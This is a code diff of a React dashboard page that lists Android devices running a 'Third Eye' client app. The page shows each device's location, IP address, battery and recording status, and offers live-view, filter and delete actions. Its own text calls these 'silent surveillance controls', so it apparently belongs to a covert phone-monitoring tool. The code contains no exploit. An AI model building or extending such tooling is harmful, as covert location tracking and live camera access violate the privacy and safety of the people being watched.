@@ -6,11 +6,29 @@ import {
   MapPin,
   BatteryCharging,
   BatteryLow,
-  ChevronLeft,
-  ChevronRight,
   Search,
+  Check,
+  Copy,
+  X,
 } from 'lucide-react';
 import { useDashboard } from '../context/DashboardContext';
+
+import Box from '@mui/material/Box';
+import Card from '@mui/material/Card';
+import Typography from '@mui/material/Typography';
+import TextField from '@mui/material/TextField';
+import InputAdornment from '@mui/material/InputAdornment';
+import Button from '@mui/material/Button';
+import IconButton from '@mui/material/IconButton';
+import Chip from '@mui/material/Chip';
+import Table from '@mui/material/Table';
+import TableBody from '@mui/material/TableBody';
+import TableCell from '@mui/material/TableCell';
+import TableContainer from '@mui/material/TableContainer';
+import TableHead from '@mui/material/TableHead';
+import TableRow from '@mui/material/TableRow';
+import Pagination from '@mui/material/Pagination';
+import Divider from '@mui/material/Divider';
 
 export default function Devices() {
   const {
@@ -23,15 +41,35 @@ export default function Devices() {
     formatTimeAgo,
   } = useDashboard();
 
+  const [statusFilter, setStatusFilter] = useState('ALL'); // ALL, ONLINE, RECORDING, OFFLINE
   const [devicePage, setDevicePage] = useState(1);
+  const [copiedId, setCopiedId] = useState(null);
   const devicesPerPage = 8;
 
-  // Filter devices by search query
-  const filteredDevices = devices.filter((d) =>
-    (d.deviceName || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
-    (d.model || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
-    (d.deviceId || '').toLowerCase().includes(searchQuery.toLowerCase())
-  );
+  const copyToClipboard = (text) => {
+    navigator.clipboard.writeText(text);
+    setCopiedId(text);
+    setTimeout(() => setCopiedId(null), 2000);
+  };
+
+  // Filter devices by search query and status filter
+  const filteredDevices = devices.filter((d) => {
+    const matchesSearch =
+      (d.deviceName || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
+      (d.model || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
+      (d.deviceId || '').toLowerCase().includes(searchQuery.toLowerCase());
+
+    const isOnline =
+      onlineSocketDevices.has(d.deviceId) ||
+      (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60);
+
+    if (!matchesSearch) return false;
+
+    if (statusFilter === 'ONLINE') return isOnline;
+    if (statusFilter === 'RECORDING') return d.isRecording;
+    if (statusFilter === 'OFFLINE') return !isOnline;
+    return true;
+  });
 
   const totalDevicePages = Math.ceil(filteredDevices.length / devicesPerPage) || 1;
   const paginatedDevices = filteredDevices.slice(
@@ -41,208 +79,509 @@ export default function Devices() {
 
   useEffect(() => {
     setDevicePage(1);
-  }, [searchQuery]);
+  }, [searchQuery, statusFilter]);
+
+  // Status counts for quick filters
+  const onlineCount = devices.filter(
+    (d) =>
+      onlineSocketDevices.has(d.deviceId) ||
+      (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60)
+  ).length;
+
+  const recordingCount = devices.filter((d) => d.isRecording).length;
 
   return (
-    <div className="space-y-6">
-      {/* Page Header & Search */}
-      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
-        <div>
-          <h2 className="text-xl font-bold text-white flex items-center gap-2">
-            <Smartphone size={22} className="text-cyan-400" />
-            <span>Connected Devices ({devices.length})</span>
-          </h2>
-          <p className="text-xs text-gray-400">Real-time status, battery levels, and activity tracking</p>
-        </div>
+    <Box sx={{ maxWidth: 1280, mx: 'auto', display: 'flex', flexDirection: 'column', gap: 3 }}>
+      {/* Page Header */}
+      <Box sx={{ display: 'flex', flexDirection: { xs: 'column', sm: 'row' }, alignItems: { xs: 'stretch', sm: 'center' }, justifyContent: 'space-between', gap: 2 }}>
+        <Box>
+          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, flexWrap: 'wrap' }}>
+            <Smartphone size={22} color="#00e5ff" />
+            <Typography variant="h5" sx={{ fontWeight: 700, color: '#fff' }}>
+              Connected Devices Fleet
+            </Typography>
+            <Chip
+              size="small"
+              label={`${devices.length} Units`}
+              sx={{
+                background: 'rgba(0,229,255,0.12)',
+                border: '1px solid rgba(0,229,255,0.3)',
+                color: '#00e5ff',
+                fontWeight: 700,
+              }}
+            />
+          </Box>
+          <Typography variant="caption" sx={{ color: 'text.secondary', display: 'block', mt: 0.3 }}>
+            Real-time telemetry, battery health, and silent surveillance controls
+          </Typography>
+        </Box>
 
-        <div className="relative w-full sm:w-72">
-          <Search size={15} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
-          <input
-            type="text"
-            placeholder="Search device by name or ID..."
-            value={searchQuery}
-            onChange={(e) => setSearchQuery(e.target.value)}
-            className="w-full pl-9 pr-4 py-2 bg-[#101725] border border-white/10 rounded-xl text-xs text-white placeholder-gray-500 focus:outline-none focus:border-cyan-400/50"
-          />
-        </div>
-      </div>
+        {/* Search Bar */}
+        <TextField
+          size="small"
+          placeholder="Search device, model, ID..."
+          value={searchQuery}
+          onChange={(e) => setSearchQuery(e.target.value)}
+          slotProps={{
+            input: {
+              startAdornment: (
+                <InputAdornment position="start">
+                  <Search size={16} color="#64748b" />
+                </InputAdornment>
+              ),
+              endAdornment: searchQuery ? (
+                <InputAdornment position="end">
+                  <IconButton size="small" onClick={() => setSearchQuery('')} sx={{ color: '#64748b' }}>
+                    <X size={14} />
+                  </IconButton>
+                </InputAdornment>
+              ) : null,
+            },
+          }}
+          sx={{ width: { xs: '100%', sm: 300 } }}
+        />
+      </Box>
 
+      {/* Quick Filter Bar */}
+      <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1 }}>
+        <Button
+          size="small"
+          variant={statusFilter === 'ALL' ? 'contained' : 'outlined'}
+          onClick={() => setStatusFilter('ALL')}
+          sx={{
+            background: statusFilter === 'ALL' ? 'rgba(0,229,255,0.18)' : 'transparent',
+            borderColor: statusFilter === 'ALL' ? 'rgba(0,229,255,0.4)' : 'rgba(255,255,255,0.1)',
+            color: statusFilter === 'ALL' ? '#00e5ff' : 'text.secondary',
+            boxShadow: statusFilter === 'ALL' ? '0 0 12px rgba(0,229,255,0.2)' : 'none',
+          }}
+        >
+          All Devices ({devices.length})
+        </Button>
+
+        <Button
+          size="small"
+          variant={statusFilter === 'ONLINE' ? 'contained' : 'outlined'}
+          onClick={() => setStatusFilter('ONLINE')}
+          startIcon={<Box sx={{ width: 8, height: 8, borderRadius: '50%', background: '#00e676', animation: 'radar-dot-pulse 2s infinite' }} />}
+          sx={{
+            background: statusFilter === 'ONLINE' ? 'rgba(0,230,118,0.18)' : 'transparent',
+            borderColor: statusFilter === 'ONLINE' ? 'rgba(0,230,118,0.4)' : 'rgba(255,255,255,0.1)',
+            color: statusFilter === 'ONLINE' ? '#00e676' : 'text.secondary',
+            boxShadow: statusFilter === 'ONLINE' ? '0 0 12px rgba(0,230,118,0.2)' : 'none',
+          }}
+        >
+          Online ({onlineCount})
+        </Button>
+
+        <Button
+          size="small"
+          variant={statusFilter === 'RECORDING' ? 'contained' : 'outlined'}
+          onClick={() => setStatusFilter('RECORDING')}
+          startIcon={<Box sx={{ width: 8, height: 8, borderRadius: '50%', background: '#ff1744' }} />}
+          sx={{
+            background: statusFilter === 'RECORDING' ? 'rgba(255,23,68,0.18)' : 'transparent',
+            borderColor: statusFilter === 'RECORDING' ? 'rgba(255,23,68,0.4)' : 'rgba(255,255,255,0.1)',
+            color: statusFilter === 'RECORDING' ? '#ff5252' : 'text.secondary',
+            boxShadow: statusFilter === 'RECORDING' ? '0 0 12px rgba(255,23,68,0.2)' : 'none',
+          }}
+        >
+          Recording ({recordingCount})
+        </Button>
+
+        <Button
+          size="small"
+          variant={statusFilter === 'OFFLINE' ? 'contained' : 'outlined'}
+          onClick={() => setStatusFilter('OFFLINE')}
+          sx={{
+            background: statusFilter === 'OFFLINE' ? 'rgba(255,255,255,0.12)' : 'transparent',
+            borderColor: statusFilter === 'OFFLINE' ? 'rgba(255,255,255,0.25)' : 'rgba(255,255,255,0.1)',
+            color: statusFilter === 'OFFLINE' ? '#fff' : 'text.secondary',
+          }}
+        >
+          Offline ({devices.length - onlineCount})
+        </Button>
+      </Box>
+
+      {/* Main Content: Table / Cards */}
       {filteredDevices.length === 0 ? (
-        <div className="p-12 rounded-2xl bg-[#101725]/50 border border-white/10 text-center">
-          <Smartphone size={32} className="text-gray-500 mx-auto mb-3" />
-          <h3 className="text-sm font-semibold text-white">No matching devices found</h3>
-          <p className="text-xs text-gray-400 mt-1">
-            Ensure devices have the Third Eye app installed and connected to internet.
-          </p>
-        </div>
+        <Card sx={{ p: 6, textAlign: 'center', background: 'rgba(16,23,38,0.6)' }}>
+          <Smartphone size={36} color="#64748b" style={{ margin: '0 auto 12px' }} />
+          <Typography variant="subtitle1" sx={{ fontWeight: 600, color: '#fff' }}>
+            No matching devices found
+          </Typography>
+          <Typography variant="body2" sx={{ color: 'text.secondary', mt: 0.5, maxWidth: 380, mx: 'auto' }}>
+            {searchQuery || statusFilter !== 'ALL'
+              ? 'Try adjusting your search terms or filter selection.'
+              : 'Install the Third Eye client APK on devices to begin monitoring.'}
+          </Typography>
+          {(searchQuery || statusFilter !== 'ALL') && (
+            <Button
+              size="small"
+              variant="outlined"
+              onClick={() => {
+                setSearchQuery('');
+                setStatusFilter('ALL');
+              }}
+              sx={{ mt: 2, color: '#00e5ff', borderColor: 'rgba(0,229,255,0.3)' }}
+            >
+              Reset Filters
+            </Button>
+          )}
+        </Card>
       ) : (
-        <div className="rounded-2xl bg-[#101725]/80 border border-white/10 overflow-hidden backdrop-blur-md">
-          <div className="overflow-x-auto">
-            <table className="w-full text-left text-sm whitespace-nowrap">
-              <thead className="bg-[#07090e]/80 border-b border-white/10 text-xs font-mono uppercase text-gray-400">
-                <tr>
-                  <th className="px-5 py-3.5">Device Name / Model</th>
-                  <th className="px-5 py-3.5">Device ID</th>
-                  <th className="px-5 py-3.5">Location</th>
-                  <th className="px-5 py-3.5">Battery</th>
-                  <th className="px-5 py-3.5">Resolution</th>
-                  <th className="px-5 py-3.5">Status</th>
-                  <th className="px-5 py-3.5">Last Active</th>
-                  <th className="px-5 py-3.5">Total Videos</th>
-                  <th className="px-5 py-3.5 text-right">Actions</th>
-                </tr>
-              </thead>
-              <tbody className="divide-y divide-white/5">
-                {paginatedDevices.map((d) => {
-                  const isOnline =
-                    onlineSocketDevices.has(d.deviceId) ||
-                    (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60);
+        <Card sx={{ overflow: 'hidden' }}>
+          {/* ===== MOBILE CARD LAYOUT (< 600px) ===== */}
+          <Box sx={{ display: { xs: 'flex', sm: 'none' }, flexDirection: 'column' }}>
+            {paginatedDevices.map((d, index) => {
+              const isOnline =
+                onlineSocketDevices.has(d.deviceId) ||
+                (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60);
 
-                  return (
-                    <tr key={d.deviceId} className="hover:bg-white/[0.02] transition-colors">
-                      <td className="px-5 py-4">
-                        <div className="flex items-center gap-3">
-                          <div className="w-9 h-9 rounded-xl bg-cyan-500/10 border border-cyan-400/25 flex items-center justify-center text-cyan-400 shrink-0">
-                            <Smartphone size={18} />
-                          </div>
-                          <div>
-                            <div className="font-semibold text-white">{d.deviceName || 'Android Device'}</div>
-                            <div className="text-xs text-gray-400">
-                              {d.model} (v{d.androidVersion || 'Android'})
-                            </div>
-                          </div>
-                        </div>
-                      </td>
+              return (
+                <Box key={d.deviceId}>
+                  {index > 0 && <Divider sx={{ borderColor: 'rgba(255,255,255,0.05)' }} />}
+                  <Box sx={{ p: 2, display: 'flex', flexDirection: 'column', gap: 1.5 }}>
+                    {/* Top Row: Device Name & Status */}
+                    <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 1 }}>
+                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, minWidth: 0 }}>
+                        <Box sx={{
+                          width: 36, height: 36, borderRadius: '10px',
+                          background: 'rgba(0,229,255,0.1)', border: '1px solid rgba(0,229,255,0.25)',
+                          display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#00e5ff',
+                          flexShrink: 0,
+                        }}>
+                          <Smartphone size={16} />
+                        </Box>
+                        <Box sx={{ minWidth: 0 }}>
+                          <Typography variant="body2" sx={{ fontWeight: 700, color: '#fff', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                            {d.deviceName || d.model}
+                          </Typography>
+                          <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace', display: 'block', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                            {d.model}
+                          </Typography>
+                        </Box>
+                      </Box>
+                      <Chip
+                        size="small"
+                        label={d.isRecording ? 'REC' : isOnline ? 'Online' : 'Offline'}
+                        sx={{
+                          height: 22,
+                          background: d.isRecording ? 'rgba(255,23,68,0.15)' : isOnline ? 'rgba(0,230,118,0.12)' : 'rgba(255,255,255,0.04)',
+                          border: d.isRecording ? '1px solid rgba(255,23,68,0.4)' : isOnline ? '1px solid rgba(0,230,118,0.3)' : '1px solid rgba(255,255,255,0.1)',
+                          color: d.isRecording ? '#ff5252' : isOnline ? '#00e676' : '#64748b',
+                          fontFamily: '"JetBrains Mono", monospace', fontWeight: 600,
+                          flexShrink: 0,
+                        }}
+                      />
+                    </Box>
 
-                      <td className="px-5 py-4">
-                        <span className="font-mono text-xs text-gray-300 bg-white/5 px-2 py-1 rounded border border-white/5">
-                          {d.deviceId}
-                        </span>
-                      </td>
+                    {/* Metadata Grid */}
+                    <Box sx={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 1, fontSize: '0.75rem' }}>
+                      <Box>
+                        <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace', textTransform: 'uppercase', fontSize: '0.65rem', display: 'block' }}>
+                          Battery
+                        </Typography>
+                        <Typography variant="caption" sx={{
+                          fontWeight: 700, fontFamily: 'monospace',
+                          color: d.batteryLevel > 50 ? '#00e676' : d.batteryLevel > 20 ? '#f59e0b' : '#ff1744',
+                        }}>
+                          {d.batteryLevel || 0}%
+                        </Typography>
+                      </Box>
 
-                      <td className="px-5 py-4">
-                        {d.latitude && d.longitude ? (
+                      <Box>
+                        <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace', textTransform: 'uppercase', fontSize: '0.65rem', display: 'block' }}>
+                          Last Seen
+                        </Typography>
+                        <Typography variant="caption" sx={{ fontFamily: 'monospace', color: isOnline ? '#00e676' : 'text.secondary' }}>
+                          {isOnline ? 'Active now' : formatTimeAgo(d.lastSeen)}
+                        </Typography>
+                      </Box>
+
+                      {d.latitude && d.longitude && (
+                        <Box sx={{ gridColumn: 'span 2' }}>
+                          <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace', textTransform: 'uppercase', fontSize: '0.65rem', display: 'block' }}>
+                            Location
+                          </Typography>
                           <a
                             href={`https://www.google.com/maps?q=${d.latitude},${d.longitude}`}
                             target="_blank"
                             rel="noreferrer"
-                            className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-cyan-500/10 border border-cyan-400/25 text-[#00e5ff] text-xs font-medium hover:bg-cyan-500/20"
+                            style={{ display: 'inline-flex', alignItems: 'center', gap: 4, color: '#00e5ff', textDecoration: 'none', fontSize: '0.75rem' }}
                           >
-                            <MapPin size={12} />
-                            <span>{d.locationName || `${d.latitude.toFixed(2)}, ${d.longitude.toFixed(2)}`}</span>
+                            <MapPin size={11} />
+                            <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                              {d.locationName || `${d.latitude.toFixed(3)}, ${d.longitude.toFixed(3)}`}
+                            </span>
                           </a>
-                        ) : (
-                          <span className="text-xs text-gray-500">
-                            {d.ipAddress ? d.ipAddress.split(',')[0] : 'Locating...'}
-                          </span>
-                        )}
-                      </td>
+                        </Box>
+                      )}
+                    </Box>
 
-                      <td className="px-5 py-4">
-                        <span
-                          className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-xs font-semibold ${
-                            d.batteryLevel > 50
-                              ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
-                              : d.batteryLevel > 20
-                              ? 'bg-amber-500/15 text-amber-400 border border-amber-500/30'
-                              : 'bg-red-500/15 text-red-400 border border-red-500/30'
-                          }`}
-                        >
-                          {d.batteryLevel > 50 ? <BatteryCharging size={13} /> : <BatteryLow size={13} />}
-                          <span>{d.batteryLevel}%</span>
-                        </span>
-                      </td>
+                    {/* Action buttons */}
+                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, pt: 0.5 }}>
+                      <Button
+                        size="small"
+                        variant="contained"
+                        fullWidth
+                        onClick={() => handleStartLiveStream(d)}
+                        startIcon={<Radio size={13} />}
+                        sx={{
+                          background: 'linear-gradient(135deg, rgba(255,23,68,0.3) 0%, rgba(255,23,68,0.15) 100%)',
+                          border: '1px solid rgba(255,23,68,0.4)',
+                          color: '#ff5252',
+                          '&:hover': { background: 'linear-gradient(135deg, #ff1744 0%, #c4001d 100%)', color: '#fff' },
+                        }}
+                      >
+                        Watch Live
+                      </Button>
+                      <IconButton
+                        size="small"
+                        onClick={() => copyToClipboard(d.deviceId)}
+                        sx={{ border: '1px solid rgba(255,255,255,0.1)', color: '#94a3b8' }}
+                      >
+                        {copiedId === d.deviceId ? <Check size={14} color="#00e676" /> : <Copy size={14} />}
+                      </IconButton>
+                      <IconButton
+                        size="small"
+                        onClick={() => handleDeleteDevice(d.deviceId)}
+                        sx={{ border: '1px solid rgba(255,23,68,0.2)', color: '#ff5252' }}
+                      >
+                        <Trash2 size={14} />
+                      </IconButton>
+                    </Box>
+                  </Box>
+                </Box>
+              );
+            })}
+          </Box>
 
-                      <td className="px-5 py-4">
-                        <span className="px-2 py-0.5 rounded bg-white/5 border border-white/10 text-xs font-mono text-gray-300">
-                          {d.videoQuality || '720p'}
-                        </span>
-                      </td>
+          {/* ===== DESKTOP TABLE LAYOUT (>= 600px) ===== */}
+          <Box sx={{ display: { xs: 'none', sm: 'block' } }}>
+            <TableContainer>
+              <Table size="small" sx={{ minWidth: 700 }}>
+                <TableHead>
+                  <TableRow>
+                    <TableCell>Device Unit / Model</TableCell>
+                    <TableCell>Device ID</TableCell>
+                    <TableCell>Telemetry Location</TableCell>
+                    <TableCell>Battery</TableCell>
+                    <TableCell>Resolution</TableCell>
+                    <TableCell>Status</TableCell>
+                    <TableCell>Last Seen</TableCell>
+                    <TableCell align="center">Recordings</TableCell>
+                    <TableCell align="right">Surveillance Actions</TableCell>
+                  </TableRow>
+                </TableHead>
+                <TableBody>
+                  {paginatedDevices.map((d) => {
+                    const isOnline =
+                      onlineSocketDevices.has(d.deviceId) ||
+                      (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60);
 
-                      <td className="px-5 py-4">
-                        <span
-                          className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold ${
-                            d.isRecording
-                              ? 'bg-red-500/15 text-red-400 border border-red-500/30 animate-pulse'
-                              : isOnline
-                              ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
-                              : 'bg-white/5 text-gray-400 border border-white/10'
-                          }`}
-                        >
-                          {d.isRecording ? 'Recording' : isOnline ? 'Online' : 'Offline'}
-                        </span>
-                      </td>
+                    return (
+                      <TableRow key={d.deviceId} hover>
+                        {/* Device Info */}
+                        <TableCell>
+                          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
+                            <Box sx={{
+                              width: 36, height: 36, borderRadius: '10px',
+                              background: 'rgba(0,229,255,0.1)', border: '1px solid rgba(0,229,255,0.25)',
+                              display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#00e5ff',
+                              flexShrink: 0,
+                            }}>
+                              <Smartphone size={17} />
+                            </Box>
+                            <Box>
+                              <Typography variant="body2" sx={{ fontWeight: 700, color: '#fff', '&:hover': { color: '#00e5ff' } }}>
+                                {d.deviceName || d.model}
+                              </Typography>
+                              <Typography variant="caption" sx={{ color: 'text.secondary', fontFamily: 'monospace', display: 'block' }}>
+                                {d.model} {d.androidVersion ? `(v${d.androidVersion})` : ''}
+                              </Typography>
+                            </Box>
+                          </Box>
+                        </TableCell>
 
-                      <td className="px-5 py-4">
-                        {isOnline ? (
-                          <span className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-400/25 text-emerald-400 text-xs font-semibold">
-                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.8)] animate-pulse" />
-                            <span>Active now</span>
-                          </span>
-                        ) : (
-                          <span className="text-xs text-gray-400">{formatTimeAgo(d.lastSeen)}</span>
-                        )}
-                      </td>
-
-                      <td className="px-5 py-4 font-bold text-[#00e5ff]">{d.totalRecordings || 0}</td>
-
-                      <td className="px-5 py-4 text-right">
-                        <div className="inline-flex items-center gap-2">
-                          <button
-                            onClick={() => handleStartLiveStream(d)}
-                            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-500/15 border border-red-500/30 text-red-400 hover:bg-red-500/25 text-xs font-semibold transition-all shadow-[0_0_10px_rgba(239,68,68,0.15)]"
+                        {/* Device ID */}
+                        <TableCell>
+                          <Button
+                            size="small"
+                            onClick={() => copyToClipboard(d.deviceId)}
+                            endIcon={copiedId === d.deviceId ? <Check size={12} color="#00e676" /> : <Copy size={12} />}
+                            sx={{
+                              fontFamily: '"JetBrains Mono", monospace', fontSize: '0.75rem',
+                              color: '#cbd5e1', background: 'rgba(0,0,0,0.4)',
+                              border: '1px solid rgba(255,255,255,0.1)', px: 1, py: 0.2, minWidth: 0,
+                              '&:hover': { borderColor: 'rgba(0,229,255,0.4)', color: '#fff' },
+                            }}
                           >
-                            <Radio size={12} className="animate-pulse" />
-                            <span>Live View</span>
-                          </button>
-                          <button
-                            onClick={() => handleDeleteDevice(d.deviceId)}
-                            title="Remove Device"
-                            className="p-1.5 rounded-lg text-gray-400 hover:text-red-400 hover:bg-red-500/10 border border-transparent hover:border-red-500/20"
-                          >
-                            <Trash2 size={14} />
-                          </button>
-                        </div>
-                      </td>
-                    </tr>
-                  );
-                })}
-              </tbody>
-            </table>
-          </div>
+                            {d.deviceId.length > 14 ? `${d.deviceId.substring(0, 14)}...` : d.deviceId}
+                          </Button>
+                        </TableCell>
+
+                        {/* Location */}
+                        <TableCell>
+                          {d.latitude && d.longitude ? (
+                            <Button
+                              size="small"
+                              component="a"
+                              href={`https://www.google.com/maps?q=${d.latitude},${d.longitude}`}
+                              target="_blank"
+                              rel="noreferrer"
+                              startIcon={<MapPin size={12} />}
+                              sx={{
+                                fontSize: '0.75rem', py: 0.2, px: 1,
+                                background: 'rgba(0,229,255,0.08)', border: '1px solid rgba(0,229,255,0.25)',
+                                color: '#00e5ff', minWidth: 0,
+                                '&:hover': { background: 'rgba(0,229,255,0.18)' },
+                              }}
+                            >
+                              <span style={{ maxWidth: 120, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                                {d.locationName || `${d.latitude.toFixed(2)}, ${d.longitude.toFixed(2)}`}
+                              </span>
+                            </Button>
+                          ) : (
+                            <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace' }}>
+                              {d.ipAddress ? d.ipAddress.split(',')[0] : 'GPS Standby'}
+                            </Typography>
+                          )}
+                        </TableCell>
+
+                        {/* Battery */}
+                        <TableCell>
+                          <Chip
+                            size="small"
+                            icon={d.batteryLevel > 50 ? <BatteryCharging size={13} /> : <BatteryLow size={13} />}
+                            label={`${d.batteryLevel || 0}%`}
+                            sx={{
+                              height: 24,
+                              background: d.batteryLevel > 50 ? 'rgba(0,230,118,0.12)' : d.batteryLevel > 20 ? 'rgba(245,158,11,0.12)' : 'rgba(255,23,68,0.12)',
+                              border: d.batteryLevel > 50 ? '1px solid rgba(0,230,118,0.3)' : d.batteryLevel > 20 ? '1px solid rgba(245,158,11,0.3)' : '1px solid rgba(255,23,68,0.3)',
+                              color: d.batteryLevel > 50 ? '#00e676' : d.batteryLevel > 20 ? '#f59e0b' : '#ff1744',
+                              fontFamily: '"JetBrains Mono", monospace', fontWeight: 700,
+                              '& .MuiChip-icon': { color: 'inherit' },
+                            }}
+                          />
+                        </TableCell>
+
+                        {/* Resolution */}
+                        <TableCell>
+                          <Typography variant="caption" sx={{
+                            px: 1, py: 0.4, borderRadius: 1,
+                            background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,255,255,0.08)',
+                            fontFamily: '"JetBrains Mono", monospace', color: '#cbd5e1',
+                          }}>
+                            {d.videoQuality || '720p'}
+                          </Typography>
+                        </TableCell>
+
+                        {/* Status */}
+                        <TableCell>
+                          <Chip
+                            size="small"
+                            label={d.isRecording ? 'Recording' : isOnline ? 'Online' : 'Offline'}
+                            sx={{
+                              height: 24,
+                              background: d.isRecording ? 'rgba(255,23,68,0.15)' : isOnline ? 'rgba(0,230,118,0.12)' : 'rgba(255,255,255,0.04)',
+                              border: d.isRecording ? '1px solid rgba(255,23,68,0.4)' : isOnline ? '1px solid rgba(0,230,118,0.3)' : '1px solid rgba(255,255,255,0.1)',
+                              color: d.isRecording ? '#ff5252' : isOnline ? '#00e676' : '#64748b',
+                              fontFamily: '"JetBrains Mono", monospace', fontWeight: 600,
+                            }}
+                          />
+                        </TableCell>
+
+                        {/* Last Seen */}
+                        <TableCell>
+                          <Typography variant="caption" sx={{
+                            fontFamily: '"JetBrains Mono", monospace',
+                            color: isOnline ? '#00e676' : '#64748b',
+                            fontWeight: isOnline ? 600 : 400,
+                          }}>
+                            {isOnline ? 'Active now' : formatTimeAgo(d.lastSeen)}
+                          </Typography>
+                        </TableCell>
+
+                        {/* Recordings Count */}
+                        <TableCell align="center">
+                          <Typography variant="caption" sx={{
+                            fontWeight: 700, color: '#fff', fontFamily: 'monospace',
+                            background: 'rgba(255,255,255,0.04)', px: 1.5, py: 0.5, borderRadius: 1,
+                            border: '1px solid rgba(255,255,255,0.06)',
+                          }}>
+                            {d.totalRecordings || 0}
+                          </Typography>
+                        </TableCell>
+
+                        {/* Surveillance Actions */}
+                        <TableCell align="right">
+                          <Box sx={{ display: 'inline-flex', alignItems: 'center', gap: 1 }}>
+                            <Button
+                              size="small"
+                              variant="contained"
+                              onClick={() => handleStartLiveStream(d)}
+                              startIcon={<Radio size={13} />}
+                              sx={{
+                                fontSize: '0.75rem', py: 0.5, px: 1.5,
+                                background: 'linear-gradient(135deg, rgba(255,23,68,0.3) 0%, rgba(255,23,68,0.15) 100%)',
+                                border: '1px solid rgba(255,23,68,0.4)',
+                                color: '#ff5252',
+                                boxShadow: '0 0 10px rgba(255,23,68,0.2)',
+                                '&:hover': {
+                                  background: 'linear-gradient(135deg, #ff1744 0%, #c4001d 100%)',
+                                  color: '#fff',
+                                  boxShadow: '0 0 16px rgba(255,23,68,0.4)',
+                                },
+                              }}
+                            >
+                              Watch Live
+                            </Button>
+                            <IconButton
+                              size="small"
+                              onClick={() => handleDeleteDevice(d.deviceId)}
+                              title="Unlink & remove device"
+                              sx={{
+                                color: '#64748b',
+                                '&:hover': { color: '#ff5252', background: 'rgba(255,23,68,0.1)' },
+                              }}
+                            >
+                              <Trash2 size={14} />
+                            </IconButton>
+                          </Box>
+                        </TableCell>
+                      </TableRow>
+                    );
+                  })}
+                </TableBody>
+              </Table>
+            </TableContainer>
+          </Box>
 
           {/* Pagination Controls */}
           {filteredDevices.length > devicesPerPage && (
-            <div className="flex flex-col sm:flex-row items-center justify-between gap-3 p-4 bg-[#07090e]/60 border-t border-white/10">
-              <div className="text-xs text-gray-400">
+            <Box sx={{
+              display: 'flex', flexDirection: { xs: 'column', sm: 'row' },
+              alignItems: 'center', justifyContent: 'space-between',
+              gap: 2, p: 2,
+              background: 'rgba(8,13,22,0.9)',
+              borderTop: '1px solid rgba(255,255,255,0.06)',
+            }}>
+              <Typography variant="caption" sx={{ color: 'text.secondary', fontFamily: 'monospace' }}>
                 Showing {(devicePage - 1) * devicesPerPage + 1} -{' '}
                 {Math.min(devicePage * devicesPerPage, filteredDevices.length)} of {filteredDevices.length} devices
-              </div>
-              <div className="flex items-center gap-2">
-                <button
-                  disabled={devicePage === 1}
-                  onClick={() => setDevicePage((p) => Math.max(1, p - 1))}
-                  className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-white/5 border border-white/10 text-xs font-medium text-gray-300 hover:bg-white/10 hover:text-white disabled:opacity-40 disabled:cursor-not-allowed transition-all"
-                >
-                  <ChevronLeft size={14} />
-                  <span>Prev</span>
-                </button>
-                <span className="px-3 py-1 rounded-lg bg-cyan-500/10 border border-cyan-400/20 text-xs font-mono text-[#00e5ff]">
-                  Page {devicePage} of {totalDevicePages}
-                </span>
-                <button
-                  disabled={devicePage >= totalDevicePages}
-                  onClick={() => setDevicePage((p) => Math.min(totalDevicePages, p + 1))}
-                  className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-white/5 border border-white/10 text-xs font-medium text-gray-300 hover:bg-white/10 hover:text-white disabled:opacity-40 disabled:cursor-not-allowed transition-all"
-                >
-                  <span>Next</span>
-                  <ChevronRight size={14} />
-                </button>
-              </div>
-            </div>
+              </Typography>
+              <Pagination
+                count={totalDevicePages}
+                page={devicePage}
+                onChange={(_, page) => setDevicePage(page)}
+                size="small"
+                showFirstButton
+                showLastButton
+              />
+            </Box>
           )}
-        </div>
+        </Card>
       )}
-    </div>
+    </Box>
   );
 }
